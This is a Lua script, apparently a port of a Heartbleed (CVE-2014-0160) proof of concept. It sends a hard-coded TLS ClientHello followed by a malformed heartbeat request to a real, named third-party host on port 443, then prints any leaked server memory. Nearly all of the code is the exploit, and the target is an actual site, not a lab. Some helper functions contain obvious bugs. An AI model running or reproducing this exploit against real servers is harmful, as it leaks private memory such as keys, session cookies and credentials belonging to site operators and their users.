
local socket=agent.require "socket"
--local socket=require "socket"

function h2bin(x)
    x, _=string.gsub(x, " ", "")
    x, _=string.gsub(x, "\n", "")
    return x:fromhex()
end

-- Convert string of a hex form like 'aced' into standard string
--
-- @param str The hex string to be converted
-- @return The standard string that converted from str
function string.fromhex(str)
    return (str:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

-- Convert string into a hex form like 'aced' 
--
-- @param str The String to be converted
-- @return The hex string that converted from str
function string.tohex(str)
    return (str:gsub('.', function (c)
        return string.format('%02X', string.byte(c))
    end))
end

function join(tbl, del, strFun)
    local res=""
    for _, v in pairs(tbl) do
        res=res..strFun(v)..del
    end
    
    return res
end

--string.format("%02X", string.byte(v))

local hello = h2bin([[
16 03 02 00              dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
]])

local hb = h2bin([[ 
18 03 02 00 03
01 40 00
]])

function unpackHeader(str)
    local c1, c2, c3, c4, c5=string.byte(str, 1, 5)
    return c1, c2*256+c3, c4*256+c5
    
end

function unpack(t, i, l)
    i=i or 1
    if t[i]~=nil and i<=l then
        return t[i], unpack(t, i+1, 16)
    end
end

function hexdump(s)
    for b=0, len(s), 16 do
        local lin=unpack(s, 1, 16)
        local hxdat=join(lin, " ", function(v)
            return string.format("%02X", string.byte(v))
        end)
        
        local pdat=join(lin, "", function(v)
            if 32<=string.byte(v)<=126 then
                return v
            else
                return "."
            end
        end)

        print(string.format('  %04x: %-48s %s', b, hxdat, pdat))
    end
end

function chunkByte(rdata, len)
    if string.len(rdata)<=len then
        print(string.byte(rdata, 1, string.len(rdata)))
        return string.byte(rdata, 1, string.len(rdata))
    else
        local tbl={}
        for i=1, string.len(rdata), len do
            local endInd=i+len-1
            if endInd>string.len(rdata) then
                endInd=string.len(rdata)
            end
            table.insert(tbl, string.sub(rdata, i, endInd))
            print(string.byte(string.sub(rdata, i, endInd), 1, endInd-i+1))
        end
    end
end

function showLis(lis)
    for key, value in pairs(lis) do
        print(key, value)
    end
end

function recvall(s, length, timeout)
    local endtime=os.time()+timeout
    local rdata=""
    local remain=length

    -- print(string.format("--recvmsg--current socket status is %s", s:getstats()))
    while remain>0 do
        local rtime=endtime-os.time()
        if rtime<0 then
            print(string.format("The connection is out of time"))
            return nil
        else
            local canR, _, _=socket.select({s}, nil, 10)
            for _, client in pairs(canR) do
                --print(string.format("Available socket is %d", client:getstats()))
                if client==s then
                    --print(string.format("Available socket equals to s is %d: %d", client:getstats(), s:getstats()))
                    local data, errorMsg=s:receive(remain)

                    if not data then
                        print(data, errorMsg)
                        print(s:getstats())
                        return nil
                    end
                    
                    rdata=rdata..data
                    remain=remain-string.len(data)
                end
            end
        end
    end
    chunkByte(rdata, 1024)

    return rdata
end

function recvmsg(s)
    local hdr=recvall(s, 5, 5)

    if not hdr then
        return nil, nil, nil
    end
    local typ, ver, ln=unpackHeader(hdr)
    print(string.format(" ... received message: type = %d, ver = %04x, ln = %d", typ, ver, ln))
    --local pay=recvall(s, ln, 15)

    local pay=""
    for i=1, ln, 8192 do
        local endInd=i+8192-1
        if endInd>ln then
            endInd=ln
        end

        local payNew=recvall(s, endInd, 25)
        if not pay then
            pay=payNew
        else
            if payNew then
                pay=pay..payNew
            else
                break
            end
        end
    end

    if not pay then
        print(string.format(" ... unexpected EOF receiving record payload - server closed connection"))
        return nil, nil, nil
    end

    print(string.format(" ... received message: type = %d, ver = %04x, length = %d", typ, ver, string.len(pay)))
    return typ, ver, pay
end

function hit_hb(s)
    s:send(hb)
    while true do
        local typ, ver, pay=recvmsg(s)
        if not typ then
            print('No heartbeat response received, server likely not vulnerable')
            return false
        end

        if typ==24 then
            print('Received heartbeat response:')
            print(pay)
            if string.len(pay)>3 then
                print('WARNING: server returned more data than it should - server is vulnerable!')
            else
                print('Server processed malformed heartbeat, but did not return any extra data.')
            end
            
            return true
        end

        if typ==21 then
            print('Received alert:')
            print(pay)
            print('Server returned error, likely not vulnerable')
            return false
        end
    end
end

function main()
    local address="www.golo365.com.cn"
    local port=443

    print("Connecting...")
    local target=socket.connect(address, port)

    print('Sending Client Hello...')
    target:send(hello)

    print('Waiting for Server Hello...')
    while true do
        local typ, ver, pay=recvmsg(target)
        if not typ then
            print "Server closed connection without sending Server Hello."
        end

        if typ==22 and string.byte(pay)==14 then
            break
        end
    end

    print("Sending heartbeat request...")
    --target:send(hb)
    hit_hb(target)
    target:close()
end


print("\n\n\n--Script start running--")
local a={'a', 'b', 'd', 'c', 'b'}
print(join(a, " ", function(v)
    return string.format("%02X", string.byte(v))
end))

main()
print("--Script stop running--\n\n\n")
